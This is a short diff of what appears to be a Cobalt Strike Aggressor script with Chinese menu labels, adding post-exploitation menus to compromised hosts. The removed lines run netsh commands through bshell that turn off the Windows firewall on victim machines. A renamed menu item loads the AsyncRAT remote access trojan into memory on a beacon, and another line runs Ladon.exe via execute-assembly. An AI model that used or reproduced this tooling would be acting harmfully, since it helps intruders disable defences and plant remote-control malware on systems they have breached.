@@ -178,20 +178,7 @@ sub noNetApiAdd_adds {
 		}
 		
 		
-		menu "关闭防火墙" {
-				item "win2003之前" {
-			local('$bid');
-			foreach $bid ($1){
-				bshell($1, "netsh firewall set opmode disable");
-			}
-		}
-				item "win2003之后" {
-			local('$bid');
-			foreach $bid ($1){
-				bshell($1, "netsh advfirewall set allprofiles state off");
-			}
-		}
-		}
+
     menu "RDP相关" {
 
 				item "获取RDP端口" {
@@ -518,9 +505,9 @@ sub gethtml {
 	bexecute_assembly($bid, script_resource("/script/Ladon.exe"), $arg);
 }
 
-			item "AsyncRAT上线" {
+			item "Async上线" {
 				$bid = $1;
-				$dialog = dialog("内存加载AsyncRAT服务端上线", %(bid => $bid), &asyncrat);
+				$dialog = dialog("内存加载Async服务端上线", %(bid => $bid), &asyncrat);
 				drow_file($dialog, "server", "server: ");			
 				dbutton_action($dialog, "运行");
 				dialog_show($dialog);
